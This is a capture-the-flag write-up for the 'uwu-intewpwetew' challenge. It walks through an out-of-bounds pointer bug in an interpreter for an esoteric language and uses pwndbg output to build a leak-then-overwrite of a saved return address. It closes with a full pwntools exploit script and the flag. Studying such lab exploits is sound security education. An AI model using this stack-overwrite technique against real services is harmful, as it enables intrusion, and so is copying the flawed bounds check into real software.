# uwu-intewpwetew

## Challenge

The challenge is a partial interpreter for the "[UwU](https://github.com/KiraDotRose/UwU)" esoteric
programming language, which is derived from brainfuck.

The interpreter allows the programmer to move a single pointer, increment/decrement the data at the
pointer, and read into/write from the pointer.

The challenge gives us some example UwU code, then allows us to enter our own.
For example, the example code looks like this:

```
me wwote an intewpwetew fow da uwu wanguage
Ex: "@w@ OwO @w@ UwU @w@ QwQ @w@ owo @w@ >w< @w@"
Send me your cowode:
@w@ OwO @w@ UwU @w@ QwQ @w@ owo @w@ >w< @w@

pointer: 0
data: 0

pointer: 1
data: 0

pointer: 1
data: 1

pointer: 1
data: 0

pointer: 0
data: 0

Input: 10

pointer: 0
data: 10
```

The `@w@` instructions are used to print the pointer position and the value at the pointer.

There is also a `win` function that is not used in normal execution:

```c
void win() {
    FILE* flagfile = fopen("flag.txt", "r");

    if (flagfile == NULL) {
        puts("Error: flag.txt does not exist, contact an admin!");
        exit(1);
    }

    fgets(flag, FLAG_LEN, flagfile);
    puts(flag);
}
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

The bounds checking on the move pointer instructions has a bug:

```c
switch (instruction[0]) {
    case 'O':
        pointer++;
        if (pointer > DATA_LEN) {
            printf("Error: out of bounds\n");
            print_remaining_and_exit(input, i);
        }
        break;
    case 'o':
        pointer--;
        if (pointer > DATA_LEN) {
            printf("Error: out of bounds\n");
            print_remaining_and_exit(input, i);
        }
        break;
```

It correctly checks that the pointer does not exceed the maximum bound when incrementing the pointer.
However, the bounds check for decrementing the pointer is identical.
It tests that the pointer does not exceed the maximum bound, rather than testing that it does not
fall below the minimum bound.
This allows us to move the pointer out of bounds and manipulate memory used by other functions.

Let's debug the `vuln` function with [pwndbg](https://github.com/pwndbg/pwndbg) to see where our pointer
starts relative to RSP.

Before `fgets` our context looks like this:

```asm
──────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
   0x10000133b <vuln+40>    mov    qword ptr [rbp - 0x418], rax
   0x100001342 <vuln+47>    mov    rdx, qword ptr [rip + 0x2ce7] <0x100004030>
   0x100001349 <vuln+54>    mov    rax, qword ptr [rbp - 0x418]
   0x100001350 <vuln+61>    mov    esi, 0x100
   0x100001355 <vuln+66>    mov    rdi, rax
 ► 0x100001358 <vuln+69>    call   fgets@plt                   <fgets@plt>
        s: 0x1000052a0 ◂— 0x0
        n: 0x100
        stream: 0x7ffff7f9c800 (_IO_2_1_stdin_) ◂— 0xfbad208b
 
   0x10000135d <vuln+74>    mov    dword ptr [rbp - 0x424], 0
   0x100001367 <vuln+84>    jmp    vuln+137                   <vuln+137>
 
   0x100001369 <vuln+86>    mov    edx, dword ptr [rbp - 0x424]
   0x10000136f <vuln+92>    mov    rax, qword ptr [rbp - 0x418]
   0x100001376 <vuln+99>    add    rax, rdx
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdca0 ◂— 0x4
01:0008│     0x7fffffffdca8 —▸ 0x7ffff7fcdce0 ◂— 0x2fff0
02:0010│     0x7fffffffdcb0 —▸ 0x7fffffffddf0 ◂— 0x44869b7ce00e3
03:0018│     0x7fffffffdcb8 —▸ 0x1000052a0 ◂— 0x0
04:0020│     0x7fffffffdcc0 ◂— 0x7
05:0028│     0x7fffffffdcc8 ◂— 0xc00000007
06:0030│     0x7fffffffdcd0 —▸ 0x7ffff7fcd6e8 ◂— 0xd0012000001d2
07:0038│     0x7fffffffdcd8 —▸ 0x7ffff7fd97c5 (_dl_protect_relro+69) ◂— test   eax, eax
```

If we step past the first for-loop, we get the following:

```asm
──────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
   0x10000170c <vuln+1017>    jbe    vuln+197                   <vuln+197>
    ↓
   0x1000013d8 <vuln+197>     mov    eax, dword ptr [rbp - 0x41c]
   0x1000013de <vuln+203>     and    eax, 3
   0x1000013e1 <vuln+206>     cmp    eax, 3
   0x1000013e4 <vuln+209>     je     vuln+247                   <vuln+247>
 
 ► 0x1000013e6 <vuln+211>     mov    edx, dword ptr [rbp - 0x41c]
   0x1000013ec <vuln+217>     mov    rax, qword ptr [rbp - 0x418]
   0x1000013f3 <vuln+224>     add    rax, rdx
   0x1000013f6 <vuln+227>     mov    edx, dword ptr [rbp - 0x41c]
   0x1000013fc <vuln+233>     and    edx, 3
   0x1000013ff <vuln+236>     movzx  eax, byte ptr [rax]
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdca0 ◂— 0x4
01:0008│     0x7fffffffdca8 ◂— 0x3f7fcdce0
02:0010│     0x7fffffffdcb0 ◂— 0x0
03:0018│     0x7fffffffdcb8 —▸ 0x1000052a0 ◂— 0x557755 /* 'UwU' */
04:0020│ rdx 0x7fffffffdcc0 ◂— 0x0
... ↓        3 skipped
```

Let's take a deeper look at the stack:

```asm
pwndbg> tel 100
00:0000│ rsp 0x7fffffffdca0 ◂— 0x4
01:0008│     0x7fffffffdca8 ◂— 0x3f7fcdce0
02:0010│     0x7fffffffdcb0 ◂— 0x0
03:0018│     0x7fffffffdcb8 —▸ 0x1000052a0 ◂— 0x557755 /* 'UwU' */
04:0020│ rdx 0x7fffffffdcc0 ◂— 0x0
... ↓        95 skipped
```

A large section of memory has been zeroed.
We can be fairly confident that this is the data array.
To be certain, I sent `UwU` as my code, which will increment the value at the pointer.

If we step until the `leave` instruction, our context looks like this:

```asm
──────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
   0x100001714    <vuln+1025>                nop    
   0x100001715    <vuln+1026>                nop    
   0x100001716    <vuln+1027>                mov    rax, qword ptr [rbp - 8]
   0x10000171a    <vuln+1031>                xor    rax, qword ptr fs:[0x28]
   0x100001723    <vuln+1040>                je     vuln+1047                   <vuln+1047>
    ↓
 ► 0x10000172a    <vuln+1047>                leave  
   0x10000172b    <vuln+1048>                ret    
    ↓
   0x100001794    <main+104>                 mov    eax, 0
   0x100001799    <main+109>                 pop    rbp
   0x10000179a    <main+110>                 ret    
    ↓
   0x7ffff7e03b25 <__libc_start_main+213>    mov    edi, eax
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdca0 ◂— 0x4
01:0008│     0x7fffffffdca8 ◂— 0x3f7fcdce0
02:0010│     0x7fffffffdcb0 ◂— 0x300000000
03:0018│     0x7fffffffdcb8 —▸ 0x1000052a0 ◂— 0x557755 /* 'UwU' */
04:0020│     0x7fffffffdcc0 ◂— 0x1
05:0028│     0x7fffffffdcc8 ◂— 0x0
... ↓        2 skipped
```

If we compare this to the previous telescope view, we can see that we incremented the value at
0x7fffffffdcc0.
Thus, our pointer must start at `RSP + (0x7fffffffdcc0 - 0x7fffffffdca0) = RSP + 0x20`.
This means that our pointer starts at an address 0x28 bytes greater than the saved return address if we
call a function from `vuln`.

The size of elements in our data array is 4 bytes.
Therefore, by decrementing the pointer 10 times, we will be pointing at the saved return address if we
call a function.

First, note that PIE is enabled.
If we are to overwrite the return address, we first need a leak so we know what address to write.

Notice that the `@w@` instruction lets us print the value at the address of the pointer.
If we move the pointer to the next saved return address, then print it with `@w@`, we can read this
value from the stack.
The return address here should be one near the start of `vuln`, as this is where RIP would be when
the call to `malloc` is made.

To be certain, we can also use two `@w@` instructions.
The first one calls `printf` so we know exactly where the RIP would have been at the start of the call.
The second one is used to read this saved RIP.

Either way, we can use this to calculate the base address of the executable and therefore, the `win`
function.

Once we have the `win` function address, we can use `>w<` to overwrite the less significant bytes of
the return address to this function.
By calling `scanf`, we will push a saved RIP address within `vuln`.
`scanf` will overwrite this address while it's called.
Once it returns, it will return to the new address, which is the `win` function.

Thus, our payload looks like this:

```
owo owo owo owo owo owo owo owo owo owo @w@ @w@ >w<
```

and we can use pwntools to read the leak and calculate our new address:

```py
io.recvuntil(b"data: ")
io.recvuntil(b"data: ")

leak = int(io.recvuntil(b"\n", drop=True), 10)

offset = exe.sym['win'] - (exe.sym['vuln'] + 0x35d)

io.sendlineafter(b"Input: ", str(leak + offset).encode())
```

This will cause `scanf` to jump to the `win` function when it returns and print the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1469 uwu-intewpwetew
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('uwu-intewpwetew')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1469)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

payload = b"owo " * 10 + b"@w@ @w@ " + b">w<"
io.sendlineafter(b"Send me your cowode:\n", payload)

io.recvuntil(b"data: ")
io.recvuntil(b"data: ")

leak = int(io.recvuntil(b"\n", drop=True), 10)

offset = exe.sym['win'] - (exe.sym['vuln'] + 0x35d)

io.sendlineafter(b"Input: ", str(leak + offset).encode())

io.interactive()
```

## Flag

```
maple{nyo_wespect_fow_boundawies}
```
